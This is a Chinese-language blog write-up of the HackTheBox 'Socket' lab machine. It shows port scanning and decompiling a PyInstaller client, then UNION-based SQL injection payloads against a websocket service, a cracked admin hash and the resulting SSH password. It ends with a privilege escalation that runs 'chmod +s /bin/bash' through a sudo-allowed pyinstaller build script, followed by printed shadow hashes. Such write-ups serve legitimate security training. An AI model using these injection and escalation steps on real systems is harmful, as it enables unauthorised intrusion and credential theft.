---
title: Socket - HackTheBox
url: https://darkwing.moe/2023/03/27/Socket-HackTheBox/
source: 喵喵喵喵
date: 2023-03-28
fetch_date: 2025-10-04T10:49:53.582462
---

# Socket - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

Socket - HackTheBox

# Socket - HackTheBox

##### 2023-03-27

#### TOC

1. [1. 基本信息](#基本信息)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 80](#80)
3. [3. QReader](#QReader)
   1. [3.1. app](#app)
4. [4. websocket](#websocket)
   1. [4.1. sql injection](#sql-injection)
5. [5. user flag](#user-flag)
6. [6. 提权信息](#提权信息)
   1. [6.1. build-installer.sh](#build-installer-sh)
7. [7. 提权 & root flag](#提权-amp-root-flag)
   1. [7.1. miao.spec](#miao-spec)
   2. [7.2. shadow](#shadow)
8. [8. 参考资料](#参考资料)

# Socket - HackTheBox

2023-03-27

# 基本信息

* <https://app.hackthebox.com/machines/Socket>
* 10.10.11.206

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032701.jpg)

# 端口扫描

22和80：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.206 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-27 14:06 CST Nmap scan report for 10.10.11.206 Host is up (0.10s latency). Not shown: 998 closed tcp ports (conn-refused) PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA) |_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519) 80/tcp open  http    Apache httpd 2.4.52 |_http-title: Did not follow redirect to http://qreader.htb/ |_http-server-header: Apache/2.4.52 (Ubuntu) Service Info: Host: qreader.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 49.47 seconds ``` |

## 80

需要加hosts.在线的QReader：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` 10.10.11.206 qreader.htb ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032702.jpg)

# QReader

在线功能就是输入文字生成二维码，以及扫描提取二维码内容，但还提供有app下载：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032703.jpg)

## app

下载下来分析，这里小坑，根据网站是flask猜测这里是直接python打包的app,提取出来pyc：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` pip3 install -U pyinstaller pyi-archive_viewer qreader.exe  ? X qreader to filename? ./qreader.pyc ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032704.jpg)

然后反编译pyc得到python源码(python版本也会坑，3.8可以)：

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` pip3 install uncompyle6 uncompyle6 qreader.pyc > qreader.py ``` |

##qreader.py

代码里发现websocket，对应域名同样加hosts：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ``` | ``` ... ws_host = 'ws://ws.qreader.htb:5789' ...     def version(self):         response = asyncio.run(ws_connect(ws_host + '/version', json.dumps({             'version': VERSION })))         data = json.loads(response)         if 'error' not in data.keys():             version_info = data['message']             msg = f'''[INFO] You have version {version_info['version']} which was released on {version_info['released_date']}'''             self.statusBar().showMessage(msg)             return None         error = None['error']         self.statusBar().showMessage(error) ... ``` |

# websocket

根据代码测试构造请求，得到响应：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032705.jpg)

简单的测试发现存在注入(闭合需要用双引号)：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032706.jpg)

## sql injection

wscat一次只能一条请求，可以把流量转发到burp方便后续操作：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` wscat -c ws://ws.qreader.htb:5789/version --proxy http://127.0.0.1:8080 ``` |

后续就是一步步注入获取信息，因为有回显所以简单几步手动就可以，(注意数据库是sqlite)：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 ``` | ``` {"version":"0.0.3\" UNION SELECT 1,2,3,4-- -"} {"version":"0.0.3\" UNION SELECT sqlite_version(),2,3,4-- -"} {"version":"0.0.3\" UNION SELECT group_concat(name),2,3,4 from sqlite_schema-- -"}  {"version":"0.0.3\" UNION SELECT sql,2,3,4 from sqlite_master WHERE type!=\"meta\" AND sql NOT NULL AND name =\"users\"-- -"} {"message": {"id": "admin", "version": "0c090c365fa0559b151a43e0fea39710", "released_date": 3, "downloads": 4}}  # 获取管理员的用户名 {"version":"0.0.3\" UNION SELECT group_concat(answered_by),group_concat(answer),3,4 from answers-- -"} Thomas Keller ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032707.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032708.jpg)

# user flag

这里也有小坑，密码就是前面得到的hash破解出明文，用户名需要根据全名以及命名规则简单的猜一下：

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` Thomas Keller -> tkeller 0c090c365fa0559b151a43e0fea39710 -> denjanjade122566  ssh tkeller@10.10.11.206 ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032709.jpg)

# 提权信息

sudo -l发现一个sh，查看内容发现build调用pyinstaller

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032710.jpg)

* Using PyInstaller — PyInstaller 5.9.0 documentation
  <https://pyinstaller.org/en/stable/usage.html>

实际上可以直接执行任意python代码，并不需要满足spec格式

## build-installer.sh

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 ``` | ``` #!/bin/bash if [ $# -ne 2 ] && [[ $1 != 'cleanup' ]]; then   /usr/bin/echo "No enough arguments supplied"   exit 1; fi  action=$1 name=$2 ext=$(/usr/bin/echo $2 |/usr/bin/awk -F'.' '{ print $(NF) }')  if [[ -L $name ]];then   /usr/bin/echo 'Symlinks are not allowed'   exit 1; fi  if [[ $action == 'build' ]]; then   if [[ $ext == 'spec' ]] ; then     /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null     /home/svc/.local/bin/pyinstaller $name     /usr/bin/mv ./dist ./build /opt/shared   else     echo "Invalid file format"     exit 1;   fi elif [[ $action == 'make' ]]; then   if [[ $ext == 'py' ]] ; then     /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null     /root/.local/bin/pyinstaller -F --name "qreader" $name --specpath /tmp    /usr/bin/mv ./dist ./build /opt/shared   else     echo "Invalid file format"     exit 1;   fi elif [[ $action == 'cleanup' ]]; then   /usr/bin/rm -r ./build ./dist 2>/dev/null   /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null   /usr/bin/rm /tmp/qreader* 2>/dev/null else   /usr/bin/echo 'Invalid action'   exit 1; fi ``` |

# 提权 & root flag

准备一个spec文件，里面是我们想要执行的python代码，然后运行脚本build：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032711.jpg)

## miao.spec

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` import os os.system("chmod +s /bin/bash") ``` |

## shadow

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` root:$y$j9T$OLN5GxGBDoi4BrbdKdL/D0$W8iLzJQcU2QHkw97ZsyBRgSOI8Y/ZqxYRrqktrV7PMD:19326:0:99999:7::: svc:$y$j9T$5Yt6cQk/UYMTQ/WvjwgJW/$P7mPNqZI3yy9gSPD8/WRtwNTfEBdQS7HlEd66zgDpw2:19326:0:99999:7::: tkeller:$y$j9T$tZ5IIJbeXPN93a5DzGnhw1$2DoCFmSy2Sd8uqcrtrUxwxnKnJjVgHruggUBtsfvv75:19320:0:99999:7::: ``` |

# 参考资料

* Using PyInstaller — PyInstaller 5.9.0 documentation
  <https://pyinstaller.org/en/stable/usage.html>
* Socket | Notes
  <https://blog.zerospl0it.com/posts/Socket/>

> Last updated: 2023-07-17 08:29:49
>
> 水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
>
> [![暗羽](/img/avatar.jpg)
> 暗羽](https://darkwing.moe)

* [HackTheBox](/tags/HackTheBox/)

[Prev

#### Coder - HackTheBox](/2023/04/05/Coder-HackTheBox/)

[Next

#### Cerberus - HackTheBox](/2023/03/22/Cerberus-HackTheBox/)

站点总访客数：

站点总访问量：

This blog is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).

暗羽 © 2014 - 2025

Power by [Hexo](http://hexo.io/) Theme [indigo](https://github.com/yscoder/hexo-theme-indigo)

扫一扫，分享到微信

![微信分享二维码](data:image/png;base64...)

- [{title}

  {tags}

  {date}](%7Bpath%7D)